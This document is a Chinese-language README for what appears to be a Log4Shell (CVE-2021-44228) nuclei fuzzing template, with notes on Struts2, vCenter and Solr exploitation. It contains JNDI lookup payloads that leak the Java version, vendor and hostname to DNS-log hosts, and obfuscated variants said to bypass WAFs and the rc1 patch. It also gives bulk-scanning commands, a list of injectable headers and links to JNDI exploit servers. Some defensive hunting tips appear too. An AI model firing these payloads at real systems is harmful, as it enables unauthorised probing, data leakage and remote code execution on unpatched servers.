
## 1. 更新

### 1.1 structs2版本
添加了structs2静态文件 If-Modified-Since 头利用方式。
参考：https://mp.weixin.qq.com/s/T-rcZnQxxUK1n2_lJNoUZg


### 1.2 structs2 利用变种
添加了structs2利用方式变种。
参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis


### 1.3 vCenter 利用
添加了vCenter利用
参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis


### 1.4 solr 利用
添加了Apache solr利用
参考：https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis


## 2. 关于影响面
有一个新的站点发布了比此前相对更全内容.(包括各类设备与云设施等)
- [Finding applications that use Log4J](https://www.rumble.run/blog/finding-log4j/?fbclid=IwAR0XbJNZ7FjsgVFIk5rlmf002twAaW14SJfdBHFYswWbOzDxzj4YIFnJZPU#affected-products-and-services)

## 3. 关于其他扫描器
有一个新的扫描器挺火的，暂时没有时间验证
- [log4j-scan](https://github.com/fullhunt/log4j-scan)

portswigger 放出了官方的 burpsuite 被动扫描插件，官方的应该挺好用
- Log4Shell Scanner 可以在 plugin store 直接下载

## 4. 关于 log4j2 发现漏洞后的进一步利用

### 4.1 探测 jdk 版本等
```
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
```
![image-20211214113047711](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20211214113047711.png)

### 4.2 一次性探测完
```
${jndi:ldap://${sys:java.vendor}.@.${sys:java.version}.@.${hostName}.test.dnslog.cn/exp}
```
### 其他可探测的信息
![Image](https://pbs.twimg.com/media/FGT0Im-UcAIq7IA?format=png&name=small)
### 4.3 使用tomcat等可绕过高版本jdk限制的反序列化链
可以使用 
 - [veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi)
 - [welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
 - [JNDIExploit](https://github.com/GreyDr34d/JNDIExploit)


## 5. 关于类似漏洞的挖掘 
### 5.1 挖掘其他可能存在 JndiLookup.class 的 jar 包
powershell 命令：
```powershell
gci 'C:\' -rec -force -include *.jar -ea 0 | foreach {select-string "JndiLookup.class" $_} | select -exp Path
```
powershell 脚本
[checkjndi.ps1](https://gist.github.com/wdormann/c609ae63a6ec8b58302b8cf377e0ef15)

python 脚本
[CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)

## 6. 其他组织的攻击活动
- [已有10个家族的恶意样本利用Log4j2漏洞传播](https://blog.netlab.360.com/yi-jing-you-xxxge-jia-zu-de-botnetli-yong-log4shelllou-dong-chuan-bo-wei-da-bu-ding-de-gan-jin-liao/)
# log4j1-fuzz-head-poc轻量级检测
针对 log4j来批量fuzzz 请求头检测，有效检测一些头部存在的安全风险，nuclei默认使用interactsh的dnslog

为什么用这种，这种方法也是从蜜罐中获取到攻击组织最常用的方法，简单，有效

### v2版本
添加了绕过rc1的poc
也同时能绕过常见主流waf拦截，还有高版本jdk绕过
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```


# 使用
```
/nuclei -t log4j-fuzz-head-poc.yaml -u http://www.test.com  -o res.txt  -rl 10 单个检测  速率为10（速率不要太高）

/nuclei -t log4j-fuzz-head-poc.yaml -l urls.txt  -o res.txt   -rl 10   批量检测  速率为10（速率不要太高）
```

![image](https://user-images.githubusercontent.com/50769953/145665694-21632dd2-7336-474b-80ed-9cdba4919898.png)

* X-Client-IP
* X-Remote-IP
* X-Remote-Addr
* X-Forwarded-For
* X-Originating-IP
* User-Agent
* Referer
* CF-Connecting_IP
* True-Client-IP
* X-Forwarded-For
* Originating-IP
* X-Real-IP
* X-Client-IP
* Forwarded
* Client-IP
* Contact
* X-Wap-Profile
* X-Api-Version
* If-Modified-Since(structs2)

